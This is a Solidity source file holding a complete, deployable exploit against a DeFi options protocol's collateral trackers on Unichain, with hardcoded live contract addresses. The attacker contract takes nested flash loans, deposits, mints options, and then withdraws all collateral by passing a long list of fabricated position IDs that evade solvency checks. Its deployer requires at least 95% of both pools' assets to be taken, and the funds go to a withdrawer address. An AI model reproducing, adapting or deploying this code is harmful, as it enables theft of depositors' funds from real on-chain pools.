// SPDX-License-Identifier: AGPL-3.0
pragma solidity ^0.8.13;

import "./Interfaces.sol";
import {TokenId} from "@types/TokenId.sol";

contract ETH_WBTC5bpsUnichainAttacker_Deployer {
    ETH_WBTC5bpsUnichainAttacker public attacker;
    IWETH constant WETH = IWETH(0x4200000000000000000000000000000000000006);
    IERC20Partial token1 = IERC20Partial(address(0x927B51f251480a681271180DA4de28D44EC4AfB8)); // wbtc
    ICollateralTracker_v4 tracker0 = ICollateralTracker_v4(address(0x852A20813830d4eCC4A4878E68C14CEA214B37a2));
    ICollateralTracker_v4 tracker1 = ICollateralTracker_v4(address(0x29D72Ca95a4B301C0222569bb6EA589E908A406f));
    constructor(address _withdrawer) {
        (uint256 poolAssets0Before, , ) = tracker0.getPoolData();
        (uint256 poolAssets1Before, , ) = tracker1.getPoolData();
        attacker = new ETH_WBTC5bpsUnichainAttacker(_withdrawer);
        attacker.takeFlashLoanAndAttack();
        uint256 attackerBalance0 = WETH.balanceOf(address(attacker));
        uint256 attackerBalance1 = token1.balanceOf(address(attacker));
        require(attackerBalance0 >= (poolAssets0Before * 95) / 100);
        require(attackerBalance1 >= (poolAssets1Before * 95) / 100);
    }
}

contract ETH_WBTC5bpsUnichainAttacker is IMorphoFlashLoanCallback {
    uint256[] fake_token_uints = [16988277108887827, 17035745045722363, 16993655162578412, 17009206836208441, 16939609024273842, 17158553267796065, 17107685890532457, 17101708812844843, 17069357979992109, 17086352299123725, 17003795739444277, 17026568887818250, 17119985327481433, 17029994500126407, 17006045362593199, 17026674622507335, 17154261232855203, 16936522326425929, 17082751614160489, 17097157113273900, 16905884702516433, 17066504289794370, 17114928340284497, 16942964596981210, 17025612530710537, 16904132411153761, 17085189125086153, 16988002051593903, 16914178675719633, 17074540876198711, 17119951603807036, 17119329401324348, 17036991767596593, 17122846506677707, 17058114656058193, 17031339119151811, 16892817363524338, 17130624793684447, 17036439949713896, 17060011233606751, 17003020264083211, 16946961090832675, 16969179392893693, 17067919565309087, 17103589480369901, 17008221870292762, 16918871661380487, 16989238486935005, 16897464278369093, 17144420237880467, 17101150678162124, 16934049758747081, 16894635486029112, 16923138720850302, 16992821954860765, 16896222394180792, 16969369082248421, 16905463410247128, 17052541747857150, 17001603935953842, 17074313683106350, 16979809844856197, 17130759040409663, 16908625724213635, 17166195869489409, 17101208203141327, 17138198303696334, 16998904212967048, 16908147932247101, 16894658434788774, 16895911887472093, 17072849265831395, 17022720534783960, 17017661774688634, 17118102226994995, 16988465729292003, 16894355756410939, 16908893219668699, 16895531852075711, 17099849001593597, 17153702279128601, 17021555222469713, 16929239666017003, 16897926812058864, 17122672512185594, 17154365982004348, 16992035341009344, 17044600072961146, 17050277920000050, 16972156248137231, 16929389484689115, 17016931853357540, 16894109815048865, 17142593927072576, 17088317117953075, 17140315683590255, 17128654064464828, 16905067998086360, 17022423542452956, 17094514593261230, 17106588479166820, 17029198303267245, 17123055963217059, 16947327288449607, 16996711919775464, 16942458681986566, 17057227897167136, 17029873506273690, 16968539133849167, 16913491436315882, 16944179477276374, 17167047696388934, 17157376839885919, 16953408099015714, 16936365070053071, 16889202049759961, 16968143087326031, 17025796118226330, 17154610629572122, 16991628369728980, 16921290824134246, 16932248563778116, 16991286763756420, 17030010218713865, 16970073014124536, 3437866335631248550078689307201264, 3437866335631248550078689307201264];

    // On unichain
    address token0 = address(0); // native eth
    IERC20Partial token1 = IERC20Partial(address(0x927B51f251480a681271180DA4de28D44EC4AfB8)); // wbtc
    IMorpho morpho = IMorpho(address(0x8f5ae9CddB9f68de460C77730b018Ae7E04a140A));

    // Need this for flash loaning:
    IWETH constant WETH = IWETH(0x4200000000000000000000000000000000000006);

    ICollateralTracker_v4 tracker0 = ICollateralTracker_v4(address(0x852A20813830d4eCC4A4878E68C14CEA214B37a2));
    ICollateralTracker_v4 tracker1 = ICollateralTracker_v4(address(0x29D72Ca95a4B301C0222569bb6EA589E908A406f));
    IPanopticPool_v4 pp = IPanopticPool_v4(address(0x00000344137B8eFBF9bDBa1D56CCa688dedA8CE5));

    int24 constant MIN_V3POOL_TICK = -887272;
    int24 constant MAX_V3POOL_TICK = 887272;

    address private immutable withdrawer;

    bool private executed = false;

    constructor(address _withdrawer) {
        withdrawer = _withdrawer;
    }

    modifier onlyWithdrawer() {
        require(msg.sender == withdrawer, "Only constructor-supplied withdrawer can call this function");
        _;
    }

    function takeFlashLoanAndAttack() public {
        require(!executed);
        // take flash loan
        (uint256 poolAssets0, , ) = tracker0.getPoolData();
        (uint256 poolAssets1, , ) = tracker1.getPoolData();
        {
            // Initiate first flash loan for token0
            uint256 borrowAmount0 = 2 * poolAssets0;
            // Encode the token1 borrow amount for the nested loan
            bytes memory data = abi.encode(borrowAmount0, 2 * poolAssets1, true);
            // passing in WETH, not token0, as the asset to borrow, as token0 is ETH which is not flash-loanable
            morpho.flashLoan(address(WETH), borrowAmount0, data);
        }
        executed = true;
    }

    uint256 private token0Amount; // Store for nested callback
    function onMorphoFlashLoan(
        uint256 amount,
        bytes calldata data
    ) external override {
        require(!executed);

        (uint256 amount0, uint256 amount1, bool isFirstLoan) =
                    abi.decode(data, (uint256, uint256, bool));

        if (isFirstLoan) {
            // Store token0 amount for later
            token0Amount = amount0;

            // Initiate nested flash loan for token1
            bytes memory nestedData = abi.encode(amount0, amount1, false);
            morpho.flashLoan(address(token1), amount1, nestedData);

            // After the nested callback completes, approve token0 repayment
            WETH.approve(address(morpho), amount0);
        } else {
            // This is the nested (token1) flash loan callback
            // We now have both tokens - execute the attack
            drainPool();

            // Approve token1 repayment for the nested loan
            token1.approve(address(morpho), amount1);
        }
    }

    function drainPool() internal {
        // - deposit funds
        (uint256 attackAmount0, , ) = tracker0.getPoolData();
        (uint256 attackAmount1, , ) = tracker1.getPoolData();
        attackAmount0 = 1;
        attackAmount1 = 1;
        uint256 wethBalance = WETH.balanceOf(address(this));
        WETH.withdraw(wethBalance);
        token1.approve(address(tracker1), type(uint104).max);

        tracker0.deposit{value: wethBalance}(uint128(wethBalance), address(this));
        tracker1.deposit(uint128(token1.balanceOf(address(this))), address(this));

        // - mint ITM options
        TokenId[] memory posIdList = new TokenId[](1);
        posIdList[0] = TokenId.wrap(3778244379283210788128147562639);
        TokenId[] memory posIdList2 = new TokenId[](2);
        posIdList2[0] = TokenId.wrap(3778244379283210788128147562639);
        posIdList2[1] = TokenId.wrap(2535301209956535080202501808271);

        // --- for Asset 0
        pp.mintOptions(
            posIdList, // positionIdList
            uint128(attackAmount0), // positionSize (half of the pool assets)
            0, // effectiveLiquidityLimitX32
            MAX_V3POOL_TICK, // tickLimitLow
            MIN_V3POOL_TICK, // tickLimitHigh
            true
        );

        // --- for Asset 1
        pp.mintOptions(
            posIdList2, // positionIdList
            uint128(attackAmount1), // positionSize (half of the pool assets)
            0, // effectiveLiquidityLimitX32
            MAX_V3POOL_TICK, // tickLimitLow
            MIN_V3POOL_TICK, // tickLimitHigh
            true
        );

        // ---------------------------------------------------------------------
        // - withdraw funds with fake position list

        // Create a list of positions that don't exist
        TokenId[] memory fakeTokenIdList = generateTokenIdListFromFakeTokenUints();

        // Now use the list of positions that don't exist

        // 1. calculate how much I can withdraw
        uint256 intermediateBalance0 = tracker0.balanceOf(address(this));
        uint256 toWithdraw0 = tracker0.convertToAssets(intermediateBalance0);
        // 2. withdraw with fake list
        tracker0.withdraw(toWithdraw0, address(this), address(this), fakeTokenIdList, false);

        // repeat for token1
        uint256 intermediateBalance1 = tracker1.balanceOf(address(this));
        uint256 toWithdraw1 = tracker1.convertToAssets(intermediateBalance1);
        tracker1.withdraw(toWithdraw1, address(this), address(this), fakeTokenIdList, false);

        // Re-wrap the WETH to ultimately pay back the flash loan + keep profits in WETH, not ETH
        WETH.deposit{value: toWithdraw0}();

        // now liquidate my own position and repeat...
        // NOTE: Now that we execute the attack with a single drainPool, no need to do this - just
        // leave the uncollateralised positions open
        /* TokenId[] memory emptyTokenList = new TokenId[](0);
        pp.liquidate(emptyTokenList, address(this), posIdList2); */
    }

    function generateTokenIdListFromFakeTokenUints() internal view returns (TokenId[] memory fakeTokenIdList) {
        fakeTokenIdList = new TokenId[](fake_token_uints.length);
        for (uint16 i = 0; i < fake_token_uints.length;) {
            fakeTokenIdList[i] = TokenId.wrap(fake_token_uints[i]);
            unchecked {
              ++i;
            }
        }
    }

    function min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }

    function withdraw(address tokenAddress, uint256 amount) external onlyWithdrawer {
        if (tokenAddress == address(0)) {
            // Withdraw ETH
            require(address(this).balance >= amount, "Insufficient ETH balance");
            (bool success, ) = payable(withdrawer).call{value: amount}("");
            require(success, "ETH transfer failed");
        } else {
            // Withdraw ERC20 token
            IERC20Partial token = IERC20Partial(tokenAddress);
            require(token.balanceOf(address(this)) >= amount, "Insufficient token balance");
            token.transfer(withdrawer, amount); // revert if token transfer fails
        }
    }

    // Required to receive ETH when unwrapping WETH
    receive() external payable {
        // Accept ETH from WETH unwrapping
    }

    // Fallback for any other ETH transfers
    fallback() external payable {
        // Handle unexpected ETH transfers
    }
}
